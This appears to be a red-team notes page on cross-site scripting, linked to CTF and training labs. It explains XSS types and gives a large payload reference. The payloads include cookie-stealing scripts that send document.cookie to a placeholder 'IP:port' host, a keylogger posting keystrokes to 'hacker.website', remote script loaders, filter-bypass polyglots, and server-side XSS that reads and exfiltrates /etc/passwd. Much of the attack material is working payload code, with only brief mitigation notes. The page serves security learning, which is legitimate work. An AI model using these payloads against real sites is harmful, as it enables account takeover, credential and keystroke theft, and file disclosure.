# Cross-site Scripting (XSS)

[![xss_filter_evasion](../../../../_badges/owasp/xss_filter_evasion.svg)](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
[![dom_based_xss_prevention](../../../../_badges/owasp/dom_based_xss_prevention.svg)](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xss_injection](../../../../_badges/poat/xss_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![howwebsiteswork](../../../../_badges/thmp/howwebsiteswork.svg)](https://tryhackme.com/room/howwebsiteswork)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day6.svg)](https://tryhackme.com/room/adventofcyber2)
[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_reflected](../../../../_badges/rootme/web_client/xss_reflected.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
[![xss_dom_based_introduction](../../../../_badges/rootme/web_client/xss_dom_based_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)
[![xss_stored_filter_bypass](../../../../_badges/rootme/web_client/xss_stored_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
[![xss_dom_based](../../../../_badges/rootme/web_client/xss_dom_based.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)
[![xss](../../../../_badges/ps-course/xss.svg)](https://portswigger.net/web-security/cross-site-scripting)
[![xss_reflected](../../../../_badges/ps-lab/xss/xss_reflected.svg)](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
[![xss_stored](../../../../_badges/ps-lab/xss/xss_stored.svg)](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
[![xss_brackets_bypass](../../../../_badges/ps-lab/xss/xss_brackets_bypass.svg)](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
[![xss_href](../../../../_badges/ps-lab/xss/xss_href.svg)](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
[![xss_js_string](../../../../_badges/ps-lab/xss/xss_js_string.svg)](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
[![xss_document_write](../../../../_badges/ps-lab/xss/xss_document_write.svg)](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
[![xss_innerhtml](../../../../_badges/ps-lab/xss/xss_innerhtml.svg)](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
[![xss_jquery_href](../../../../_badges/ps-lab/xss/xss_jquery_href.svg)](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
[![xss_svg_tag](../../../../_badges/ps-lab/xss/xss_svg_tag.svg)](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
[![insecure_output_handling_in_llms](../../../../_badges/ps-lab/llm/insecure_output_handling_in_llms.svg)](https://portswigger.net/web-security/llm-attacks/lab-exploiting-insecure-output-handling-in-llms)

<div class="row row-cols-lg-2"><div>

Cross-site Scripting, most commonly called XSS, refers to injecting malicious JavaScript in a web application for it to be executed by other users. For instance, instead of a username, you could use:

```xml!
<script>alert('XSS')</script>
```

And, if the website isn't protected, then anyone consulting your profile will run the script `alert('XSS')` and will see an alert.

‚ö†Ô∏è When using XSS, you want to hide that you executed some XSS in someone's browser. So, you should ensure that no one sees anything suspicious. For instance, add a valid value before the XSS payload.

üí° XSS may be called HTML Injection when using an HTML payload.
</div><div>

Common attack vectors

* üìö Headers <small>(mostly User-Agent)</small>
* üìÑ Forms <small>(Logic flaw: not protecting dropdowns)</small>
* üç™ Cookies

Common mitigations to XSS attacks are:

* üõë [Content-Security-Policy (CSP) header](/operating-systems/networking/protocols/http.md#http-headers-in-web-applications) + secure cookies
* üõ°Ô∏è Input sanitization <small>(`htmlentities`/`addslashes` in PHP)</small>
* üîé Input filtering <small>(`strip_tags` in PHP)</small>
* üî• Web Application Firewall <small>(WAF)</small>
</div></div>

<hr class="sep-both">

## XSS Attacks

[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

<div class="row row-cols-lg-2"><div>

#### Reflected XSS

[![xss_reflected](../../../../_badges/rootme/web_client/xss_reflected.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
[![xss_reflected](../../../../_badges/ps-lab/xss/xss_reflected.svg)](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
[![xss_brackets_bypass](../../../../_badges/ps-lab/xss/xss_brackets_bypass.svg)](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
[![xss_href](../../../../_badges/ps-lab/xss/xss_href.svg)](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
[![xss_svg_tag](../../../../_badges/ps-lab/xss/xss_svg_tag.svg)](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

XSS is reflected when the injected payload is shown on the vulnerable webpage after being rendered by the web server.

üó∫Ô∏è The payload is usually inside the URL. For instance, given the URL: `https://example.com/vuln.php?q=payload` that render `payload` when loaded. We could exploit it using:

```xml!
https://example.com/vuln.php/?q=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E
```

üç∑ Users clicking on the link will execute our payload.

<br>

#### Stored XSS

[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_stored_2](../../../../_badges/rootme/web_client/xss_stored_2.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)
[![xss_stored_filter_bypass](../../../../_badges/rootme/web_client/xss_stored_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
[![xss_stored](../../../../_badges/ps-lab/xss/xss_stored.svg)](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
[![insecure_output_handling_in_llms](../../../../_badges/ps-lab/llm/insecure_output_handling_in_llms.svg)](https://portswigger.net/web-security/llm-attacks/lab-exploiting-insecure-output-handling-in-llms)

The payload is injected and stored on the server, mostly in a database. At some point, it may be executed by a vulnerable web page.

üó∫Ô∏è Comments, profiles, listings... may be vulnerable.

üç∑ For instance, assuming we use the username `<script>alert('XSS');</script>`, if the profile page is vulnerable, this code will be executed when the server renders our username.
</div><div>

#### Blind XSS

XSS is said to be blind or out-band when we are sending a payload without prior knowledge of where it will be executed.

üó∫Ô∏è Feedback, contact, or support forms. We are targeting the administrators by testing if a contact chanel is vulnerable to any XSS.

üç∑ For instance, we include images in each parameter such as `<img src="IP:PORT/username">` for `username`. If we receive a request to `/xxx` on our grabber, then the payload worked for parameter `xxx`. Otherwise, we try another payload.

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.

<br>

#### DOM-based XSS

[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
[![xss_dom_based_introduction](../../../../_badges/rootme/web_client/xss_dom_based_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
[![xss_dom_based](../../../../_badges/rootme/web_client/xss_dom_based.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)
[![xss_dom_based_eval](../../../../_badges/rootme/web_client/xss_dom_based_eval.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)
[![xss_dom_based_angularjs](../../../../_badges/rootme/web_client/xss_dom_based_angularjs.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)
[![xss_document_write](../../../../_badges/ps-lab/xss/xss_document_write.svg)](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
[![xss_js_string](../../../../_badges/ps-lab/xss/xss_js_string.svg)](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
[![xss_innerhtml](../../../../_badges/ps-lab/xss/xss_innerhtml.svg)](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
[![xss_jquery_href](../../../../_badges/ps-lab/xss/xss_jquery_href.svg)](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

DOM-based XSS occur without the server being aware of them. The client-side JavaScript is the one rendering the payload. For instance, when we use `xxx.innerHTML` or `document.write` <small>(referred to as "a sinker")</small>.

üó∫Ô∏è Mostly, javascript-based applications.

üç∑ If an application is parsing the anchor `URL#xxx` and displaying it a message, it may be exploited with JavaScript events functions as most sinkers don't allow the `script` tag.
</div></div>

<hr class="sep-both">

## XSS Payloads Quick Reference

[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

<table class="table table-bordered border-dark table-dark bg-transparent mt-4">
<thead>
<tr><th>Case</th><th>HTML</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td>

`<script>alert('XSS')</script>`<br>
`<script>print()</script>`<br>
`<plaintext>` <small>(avoid it, breaking the page)</small> <br>
`<script>fetch('TARGET/fetch1');</script>`<br>
`<script>new Image().src = "TARGET/script_img";</script>`<br>
`<script>document.location="TARGET/location";</script>`
</td></tr>

<tr><td>Boxed attribute</td><td>

`<input value="here">`<br>
`<img src="here" alt="xxx"/>`
</td><td>

`">ReferToPOC`<br>
`TARGET/img" onload="alert(1)`<br>
`" onerror="document.location='TARGET/locationIMG'`<br>
`" onerror="document.getElementById('autosubmit').submit()`<br>
`" autofocus onfocus="alert(1)`<br>
`" autofocus onfocus=alert(1);alert(2) x="`
</td></tr>

<tr><td>Unboxed attribute</td><td><code>&lt;input value=here&gt;</code></td><td>Refer to Boxed attribute without the quote.</td></tr>

<tr><td>Wrapped</td><td><code>&lt;textarea>here&lt;/textarea&gt;</code></td><td><code>&lt;/textarea&gt;ReferToPOC</code></td></tr>

<tr><td>JavaScript</td><td>

`let xxx = 'here';`<br>
`yyy.innerHTML = 'here';` <small>(can use HTML too)</small>
</td><td>

`';alert(1);//`<br>
`''-alert(1)-''` <br>
`''+alert(1)+''` <br>
`''&alert(1)&''`<br>
See also: [JavaScript eval function](/cybersecurity/red-team/s3.exploitation/vulns/injection/eval.md).
</td></tr>
</tbody></table>

<hr class="sep-both">

## HTML Tags/Attributes For XSS

<div class="row row-cols-lg-2"><div>

PortSwigger has an awesome list of HTML tags and HTML attributes allowing you to easily find [XSS payloads](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

1. FUZZ and find allowed tags
2. Select a tag in the list that you can use
3. Either test a few payloads, or FUZZ again

You may also use [xss-payload-list](https://github.com/payloadbox/xss-payload-list) <small>(6.8k ‚≠ê)</small>. Below are some of my favorites. They may not require user interaction <small>(e.g. auto)</small>, optionally according to the target <small>(e.g. auto|manual)</small>, or always <small>(e.g. manual)</small>.

* Tags: `a#href`, `iframe#src`, `object#data`, `embed#src`

```html!
<a href="javascript:alert(1)">x</a>      <!-- auto -->
```

* Tags: `DETAILS`

```html!
<details open ontoggle=alert(1)></details> <!-- auto -->
```
</div><div>

* Tags: `*`

```html!
<a id=x tabindex=1 onfocus=alert(1)></a> <!-- auto|manual -->
```

* Tags: `INPUT`, `SELECT`, `BUTTON`, `KEYGEN`, etc.

```html!
<input autofocus onfocus="alert(1)">     <!-- auto -->
```

* Tags: `IMG`, `LINK`, `INPUT`, `BODY`, `SOURCE`, etc.

```html!
<img src=1 onerror="alert(1)">           <!-- auto -->
```

* Others

```html!
<svg onload=alert(1)>
<svg><animatetransform onbegin=alert(1)>
```
</div></div>

<hr class="sep-both">

## XSS 'malicious code'

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

<div class="row row-cols-lg-2"><div>

Common "malicious code" used in PoC payloads are 

* `alert(...)`: show an alert with a message
* `console.log(...)`: print a message in the console

Real examples of malicious code can be found at [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all) <small>(üí•?)</small>.

#### Fingerprint

[![session_security](../../../../_badges/htb/session_security.svg)](https://academy.hackthebox.com/course/preview/session-security)

We sometimes need to check a few things:

* `document.domain`: current domain name
* `window.location`: current URL
* `window.origin`: when inside a IFRAME

#### Session hijacking/Cookie Stealing

[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![session_security](../../../../_badges/htb/session_security.svg)](https://academy.hackthebox.com/course/preview/session-security)
[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_dom_based_introduction](../../../../_badges/rootme/web_client/xss_dom_based_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
[![csp_bypass_nonce](../../../../_badges/rootme/web_client/csp_bypass_nonce.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)
[![xss_reflected](../../../../_badges/rootme/web_client/xss_reflected.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
[![xss_stored_filter_bypass](../../../../_badges/rootme/web_client/xss_stored_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
[![xss_dom_based](../../../../_badges/rootme/web_client/xss_dom_based.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)

Anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold üí∞, because with them, we can bypass verifications such as 2FA and access someone else account of insecure webservers.

```html!
<script>fetch('http://IP:port/?cookie=' + btoa(document.cookie));</script>
<script>fetch('http://IP:port', { method: 'POST', mode: 'no-cors', credentials: 'include', body: btoa(document.cookie) });</script>
<script>new Image().src = "http://IP:port/?cookie="+btoa(document.cookie);</script>
<script>let imageElement = document.createElement("img"); imageElement.src = "http://IP:port/?cookie="+btoa(document.cookie); document.body.appendChild(imageElement)</script>
<script>document.location="http://IP:port/?cookie="+document.cookie;</script>
```

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.

üìö Refer to [CSRF](csrf.md) for attacks using a form.
</div><div>

#### Account takeover

It's common for a XSS to target an administrator. If the cookies are secure enough <small>(expiry, httpOnly, secure, sameSite)</small>, we may try to create an account with more privileges, elevate our privileges, or steal a token.

While the code is specific to the website, we often want to load an external script which can be a hassle from a javascript event.

```html!
<dummy onevent="document.write`<script src=//example.com>`"></dummy>
<dummy onevent="appendChild(createElement`script`).src='//example.com/x.js'"></dummy>
<dummy onevent="document.body.appendChild(document.createElement`script`).src='//example.com/x.js'"></dummy>
<dummy onevent="s=document.createElement('script');s.src='//example.com/x.js';document.body.appendChild(s);"></dummy>
<dummy onevent="(s=>document.body.appendChild(s))(document.createElement('script')).src='//example.com/x.js'"></dummy>
<dummy onevent="document.appendChild(Object.assign(document.createElement('script'),{src:'//example.com/x.js'}));"></dummy>
```

#### Keylogger

Sends keys pressed to the hacker website. The script is using `btoa()` to encode in base64 the values.

```html!
<script>
    let keys = ''
    document.onkeydown = e => keys += e.key
    setInterval(() => {
        if (keys === '') return
        fetch('https://hacker.website/keylogger?key=' + btoa(keys) )
        keys = ''
    }, 1000)
</script>
```

#### Other Attacks

* Defacing websites
* Injecting a login form to access the original website
</div></div>

<hr class="sep-both">

## XSS bypasses

<div class="row row-cols-lg-2"><div>

#### XSS Filtering Bypass

This section was moved to [HTML Payloads](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#html) and [JavaScript payloads](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#javascript).

<br>

#### XSS Polygots Filtering Bypass

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

Polygot are complex payloads designed to bypass many filter:

```js!
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```
</div><div>

#### XSS Relative Path Override (RPO)

[![xss_reflected](../../../../_badges/rootme/web_client/xss_reflected.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)

Usually, a URL such as `http://example.com/a/../toto` is processed and replaced with `http://example.com/toto` before it is used.

We can use a mix of URL encoding and not encoded characters to create a URL that is not shortened but still point to a relative folder.

```diff
-https://example.com/../toto/index.php
+https://example.com/..%2Ftoto/index.php
```

This can be used to trick checks like "URL starts with".
</div></div>

<hr class="sep-both">

## XSS Tools ‚öíÔ∏è

<div class="row row-cols-lg-2"><div>

#### XSStrike

[XSStrike](https://github.com/s0md3v/XSStrike) <small>(13.7k ‚≠ê, 2022 ‚ò†Ô∏è)</small> is a popular XSS tool that is still working as of 2024 while it's not maintained.

```shell!
$ cd /opt
$ sudo git clone https://github.com/s0md3v/XSStrike.git
$ sudo chmod +x XSStrike/xsstrike.py
$ sudo ln -s /opt/XSStrike/xsstrike.py /usr/local/bin/xsstrike
$ xsstrike -u 'URL?param=vuln'
```

The tool will process the URL and the parameter to see if any are vulnerable. Press 'Enter' until you find one that works. Carefully read the payload when testing, e.g. 'mouse over,' or stuff like that.
</div><div>

#### Other tools

There are a lot of them, but they are all abandoned. If seems using web scanners such as Burp, Zaproxy, or Nessus is more common.

* [xsser](https://github.com/epsylon/xsser) <small>(1.3k ‚≠ê, 2022 ü™¶Ô∏è)</small>
* [xsscrapy](https://github.com/DanMcInerney/xsscrapy) <small>(1.7k ‚≠ê, 2022 ü™¶Ô∏è)</small>
* [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) <small>(0.5k ‚≠ê, 2021 ü™¶)</small>
* [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) <small>(1.5k ‚≠ê, 2019 ü™¶)</small> + [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express) <small>(1.8k ‚≠ê, 2021 ü™¶)</small>
* [Zeus-Scanner](https://github.com/Ekultek/Zeus-Scanner) <small>(1.0k ‚≠ê, 2019 ü™¶)</small>
* [whitewidow](https://github.com/WhitewidowScanner/whitewidow) <small>(1.0k ‚≠ê, 2018 ü™¶)</small>
</div></div>

<hr class="sep-both">

## Server-Side XSS

[![server_side_xss_dynamic_pdf](../../../../_badges/hacktricks/pentesting_web/xss_cross_site_scripting/server_side_xss_dynamic_pdf.svg)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)
[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)
[![md2pdf](../../../../_badges/thm-p/md2pdf.svg)](https://tryhackme.com/r/room/md2pdf)
[![surfer](../../../../_badges/thm-p/surfer.svg)](https://tryhackme.com/r/room/surfer)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

<div class="row row-cols-lg-2"><div>

If a website is creating a PDF using user-input, such as using [wkhtmltopdf](https://wkhtmltopdf.org/downloads.html), we may be able to execute JavaScript code.

```html!
<script>document.write('poc')</script>
<img src="http://IP:port/img"/>
<iframe src="http://IP:port/iframe"></iframe>
<object data="http://IP:port/object">
<embed src="http://IP:port/embed" width="500" height="500">
<meta http-equiv="refresh" content="0;url=http://IP:port/meta" />
```

You can learn more about your environment using:

```html!
<script>document.write(window.location)</script>
<script>document.write(typeof fetch)</script> // undefined
<script>document.write(typeof XMLHttpRequest)</script> // object
```

üìö Tools such as `exiftool` may expose the tool that created the PDF.
</div><div>

Technically, request to another server are categorized as [SSRF](ssrf.md) attacks. Some tools/configuration may prevent us from using `file://` or external URLs. Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch responses.

* We can use it to read files such as `/etc/passwd`:

```html!
<script>xhzeem=new XMLHttpRequest();xhzeem.onload=function(){document.write(this.responseText)};xhzeem.onerror=function(){document.write('failed!')};xhzeem.open("GET","file:///etc/passwd");xhzeem.send();</script>
```

* For Blind Server-Side XSS, we can use:

```html!
<script>xhzeem=new XMLHttpRequest();xhzeem.onload=function(){xhzxfil=new XMLHttpRequest();xhzxfil.open("GET",'http://IP:port/?data='+btoa(this.response),true);xhzxfil.send()};xhzeem.open("GET","file:///etc/passwd",true);xhzeem.send();</script> ;
```
</div></div>

<hr class="sep-both">

## DOM Clobbering

[![dom_clobbering](../../../../_badges/hacktricks/pentesting_web/xss_cross_site_scripting/dom_clobbering.svg)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
[![dom_clobbering](../../../../_badges/ps-course/dom_clobbering.svg)](https://portswigger.net/web-security/dom-based/dom-clobbering)
[![dom_clobbering](../../../../_badges/rootme/web_client/dom_clobbering.svg)](https://www.root-me.org/en/Challenges/Web-Client/DOM-Clobbering)

<div class="row row-cols-lg-2"><div>

DOM element can have an attribute called `id` to easily locate them. There are multiple behaviors around them that can be used to exploit vulnerable javascript code.

```html!
<a id=someProperty name=url href=//example.com></a>
```

```js!
console.log(someProperty);        // equals to "//example.com"
console.log(window.someProperty); // same as 'someProperty'
```

We are able to define attributes by nesting tags:

```html!
<!-- someForm.nodeName is equals to "<input ...>" -->
<form id=someForm><input name=nodeName></form>
```
</div><div>

In chrome-based browsers, having multiple IDs is possible.

```html!
<a id=someObject>
<a id=someObject name=url href=//example.com>
```

```js!
console.log(someProperty);     // an array with indexes
console.log(someProperty.url); // equals to "//example.com"
```

üìö See also: [Dom Clobbering Project](https://github.com/SoheilKhodayari/DOMClobbering) <small>(0.05k ‚≠ê)</small>.
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

Remediation:

```diff
-echo $variable;
-echo htmlspecialchars($variable);
+echo htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
```
</div><div>
</div></div>